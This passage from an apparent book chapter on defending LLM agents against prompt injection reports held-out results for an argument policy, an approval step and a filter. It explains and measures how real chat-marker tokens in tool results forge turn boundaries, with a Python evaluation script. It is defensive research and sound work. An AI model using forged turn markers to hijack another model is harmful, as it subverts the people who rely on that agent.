enforce-args, paired difference in utility, held-out, interval: [+0.0, +0.0] points
enforce-args, newly blocked, held-out cases: 2
enforce-args, newly let through, held-out cases: 0
enforce-approval, attack success, 60 held-out cases: 8.3% (5 of 60)
enforce-approval, attack success, 60 held-out cases, interval: [1.7%, 16.7%]
enforce-approval, utility, 15 held-out tasks: 66.7% (10 of 15)
enforce-approval, utility, 15 held-out tasks, interval: [40.0%, 86.7%]
enforce-approval, paired difference in attack success, held-out: -3.3 points
enforce-approval, paired difference in attack success, held-out, interval: [-8.3, +0.0] points
enforce-approval, paired difference in utility, held-out: +0.0 points
enforce-approval, paired difference in utility, held-out, interval: [+0.0, +0.0] points
enforce-approval, newly blocked, held-out cases: 2
enforce-approval, newly let through, held-out cases: 0
enforce-approval, held-out successes that used a gated tool: 4
enforce-approval, held-out gated successes blocked: 2
```

The undefended run on held-out is the one [chapter 3](#undefended-baseline) reports, and its numbers are the baseline here.

The dev baseline's utility was 93.3% (14 of 15), so the held-out tasks are not an easier copy of the dev tasks, and the costs in [the cost section](#what-least-privilege-costs) should be read against this baseline.

Two dev results hold on held-out. The filter's paired difference in attack success is +0.0 points, and its interval includes zero, as on dev. The argument policy's paired difference is -3.3 points, and its upper end sits at zero, as on dev.

Two do not. The first is the approval step. On held-out it stopped 2 baseline successes and let through 0. The step blocked 2 of the 4 held-out successes that made a gated call, and both stopped successes were gated calls. The dev account in [the approval section](#approval-for-side-effects), that the approver passed the gated calls the user had asked for, explains why the step stopped nothing on dev. It does not explain these held-out blocks, and this run did not trace them.

The second is the filter's effect on utility. Paired with the baseline, its change in utility is +6.7 points, and the interval is [-13.3, +33.3] points. The dev change was zero. Fifteen tasks cannot say which way the filter moved utility here. The filter also stopped 3 baseline successes and let through 3 baseline failures, so its changes to the run go both ways on this split.

The run replays each defence once, from its recorded replies, under two hash seeds, and it adds no model, split or approver. The approver is still the simulation described above, so the approval numbers here show what the step does when it approves correctly.

**Working rule:** Replay each defence on a held-out split as well as the dev split, and report both beside each other. A result that holds on dev and changes on held-out changes the claim, so write the claim for the split it holds on.

## Control tokens in untrusted text {#control-tokens-in-untrusted-text}

Chat formats mark each turn with special tokens, and a tokeniser that parses them across the whole prompt can turn text from outside into a turn boundary. The control is labelled harness (enforcement). The primary defence is in the serving stack, not the platform. The chat interface takes messages as structured roles and builds the turn markers itself, so content never goes through special-token parsing. No platform permission reaches the step the harness runs when it turns text into tokens, so the harness must handle that step itself. The fix below is teaching code and defence in depth. In the fixed mode, special tokens are parsed only in the markers the harness inserts itself, by ID, and everything else is tokenised as text.

The problem is in the tokeniser. The chat format marks the start and end of each turn with special tokens. When the tokeniser parses special tokens across the whole prompt, a marker inside a tool result becomes the model's real marker, so the model receives a turn boundary that the harness did not write. [Chapter 3](#goals-locations-styles) uses a bracket-markup fake turn, which is plain text. This measure uses the model's own markers, which is the case the tokeniser makes real.

The measure is on eleven control cases. They are the fake-turn cases rebuilt with the model's real chat markers. They are outside the frozen set of 120 and are neither dev nor held-out, so they show the mechanism on these cases and nothing more.

Example `control-tokens-paired` (Python 3.13.16 · bm25s 0.3.16 · huggingface-hub 2.4.0 · linkify-it-py 2.2.0 · markdown-it-py 4.3.0 · numpy 2.5.5 · tokenizers 0.23.3), passing in Edition 2026.11.4:

```python
"""The control-token fix on the 11-case control set (outside the frozen 120) and the 15 dev tasks, paired with the
baseline's parse. The line the prose rests on is `control set ... paired difference in attack success`, beneath its rates.
"""
from lib import cases, report, runs, scorers, tokens, variants  # lib first: threads and seeds are fixed here

MARKER = 151644  # the chat marker's id on the pinned tokenizer; main checks that it still is


def run_control(recording, variant):
    """Attack success by control case, the prompts by case, and utility by dev task, for one recording and its variant."""
    controls, benign = cases.load_control_cases(), cases.load_tasks("dev")
    assert (len(controls), len(benign)) == (11, 15), "the control set or the dev split has changed"
    model = runs.Capture(recording)
    traces = runs.replay_cases(recording, controls, variant=variant, model=model)
    tasks = runs.replay_tasks(recording, benign, variant=variant)
    success = {c.id: scorers.attack_success(c, traces[c.id]) for c in controls}
    return success, model.prompts, {t.id: scorers.utility(t, tasks[t.id]) for t in benign}


def main():
    assert tokens.ids("<|im_start|>") == [MARKER], "the chat marker's id has changed"
    on_s, on_p, on_u = run_control("ctrl-baseline-dev", "ctrl-baseline")  # special tokens parsed in the whole prompt
    off_s, off_p, off_u = run_control("ctrl-special-off-dev", "ctrl-special-off")  # parsed in trusted text only
    ids, dev = sorted(on_s), sorted(on_u)
    before, after = [on_s[c] for c in ids], [off_s[c] for c in ids]
    label = "control set (11 cases, outside the frozen 120)"
    report.rate_lines(f"{label}, attack success, special parsed", before)
    report.rate_lines(f"{label}, attack success, special off", after)
    report.paired(f"{label}, paired difference in attack success", before, after)
    util_on, util_off = [on_u[t] for t in dev], [off_u[t] for t in dev]
    report.rate_lines("utility, special parsed, 15 dev tasks", util_on)
    report.rate_lines("utility, special off, 15 dev tasks", util_off)
    report.paired("paired difference in utility, 15 dev tasks", util_on, util_off)
    # The count the point rests on: cases whose replayed prompt holds the marker in untrusted text, in each mode.
    on_mode = variants.VARIANTS["ctrl-baseline"].special_in_untrusted
    off_mode = variants.VARIANTS["ctrl-special-off"].special_in_untrusted
    reached_on = sum(any(runs.reached(p, on_mode, MARKER) for p in on_p[c]) for c in ids)
    reached_off = sum(any(runs.reached(p, off_mode, MARKER) for p in off_p[c]) for c in ids)
    print(f"control token reached the model, special parsed, {label}: {reached_on}")
    print(f"control token reached the model, special off, {label}: {reached_off}")
    assert reached_on > 0 and reached_off == 0, "the fix does not change what reaches the model"


if __name__ == "__main__":
    main()
```

Output:

```text
control set (11 cases, outside the frozen 120), attack success, special parsed: 45.5% (5 of 11)
control set (11 cases, outside the frozen 120), attack success, special parsed, interval: [18.2%, 72.7%]
control set (11 cases, outside the frozen 120), attack success, special off: 18.2% (2 of 11)
control set (11 cases, outside the frozen 120), attack success, special off, interval: [0.0%, 45.5%]
control set (11 cases, outside the frozen 120), paired difference in attack success: -27.3 points
control set (11 cases, outside the frozen 120), paired difference in attack success, interval: [-54.5, +0.0] points
utility, special parsed, 15 dev tasks: 93.3% (14 of 15)
utility, special parsed, 15 dev tasks, interval: [80.0%, 100.0%]
utility, special off, 15 dev tasks: 93.3% (14 of 15)
utility, special off, 15 dev tasks, interval: [80.0%, 100.0%]
paired difference in utility, 15 dev tasks: +0.0 points
paired difference in utility, 15 dev tasks, interval: [+0.0, +0.0] points
control token reached the model, special parsed, control set (11 cases, outside the frozen 120): 11
control token reached the model, special off, control set (11 cases, outside the frozen 120): 0
```

With special tokens parsed, the baseline's attack success on the eleven control cases was 45.5% (5 of 11). With the fix it was 18.2% (2 of 11). The paired difference is -27.3 points, with an interval of [-54.5, +0.0] points. The interval reaches zero. With eleven cases, one case moves the rate by a large step, so the drop is a sign of the mechanism and not a rate to quote. Two cases still succeeded with the fix. No control token reached the model in them, so the fix does not address an instruction the model follows as plain text.

The mechanism is what the example checks. In the baseline parse, the chat marker's ID reached the model in 11 of the control cases. With the fix it reached the model in 0, and the example asserts that zero. Utility on the dev tasks was 93.3% (14 of 15) with the fix, against 93.3% (14 of 15) without it.

The regression example checks the fixed mode on eight paths, in the composed prompt and not only in the input: the untrusted body, a model reply, an error message, a refusal reason, a sender field, the system prompt, the task text and a tool description. On each path the baseline puts an extra marker ID into the prompt, and the fixed mode puts none there beyond the harness's own markers. That is the whole claim. Nothing in it asserts that the model ignores a marker it reads as plain text, and no path beyond these eight is checked.

**Working rule:** Tokenise untrusted text with special tokens off, insert your own markers by ID, and check the token IDs of the composed prompt, not only of the input. Do not escape a marker by changing its characters: that changes the text the model reads, and this chapter does not measure what that does.

## What least privilege costs {#what-least-privilege-costs}

A control's cost shows up as the tasks it stops, so this section measures utility on the dev tasks and counts refusals on the benign tasks as well as on the attack cases. Utility was 93.3% (14 of 15) undefended, and 93.3% (14 of 15), 93.3% (14 of 15) and 93.3% (14 of 15) under the three defences. On dev, the paired utility difference is zero under each defence, and its interval is zero too, so no task changed outcome under any defence, so fifteen tasks cannot show a cost smaller than about one task in fifteen. On held-out the filter's paired utility difference is not zero, as [the held-out run](#held-out-run) reports, so the dev zero does not carry over.

The defences did refuse calls on the benign tasks. The argument policy refused 1 call there, and the approval step refused 1, each a `book_visit` on the same task, which the baseline had already failed. The filter refused 0 calls. A refusal on a legitimate task is a cost to the user even where utility shows none, and these tasks are too few to say how often it would happen.

In production the cost is what the measure cannot see. A tool list goes stale when a task gains a step, and an argument rule written for last quarter's requests refuses this quarter's legitimate ones. Each change to a list or a rule is a review. A wrong rule stops a task, and the log shows why. An approval step puts a person's time into every side effect, and an approver who says yes to most requests is a gate in name only.

### The decisions this chapter made {#the-decisions}

- The harness writes each task's tool list from the request, and the model never writes it.
- Argument rules come from the request and the schemas, and they refuse any call they cannot check.
- The approval step in this book is a simulation, as [the approval section](#approval-for-side-effects) explains.
- Untrusted text is tokenised with special tokens off, and the harness inserts its own markers by ID.
- Every number is a dev number, a control-set number or a held-out number, where marked. The held-out run is one replay of each defence. Where held-out doesn't repeat a dev result, this chapter says so.

**Working rule:** Measure utility on the same tasks with and without each control, and count refusals on the benign tasks as well as on the attack cases. A control that shows no utility cost on fifteen tasks has shown only that its cost is under about one task in fifteen.
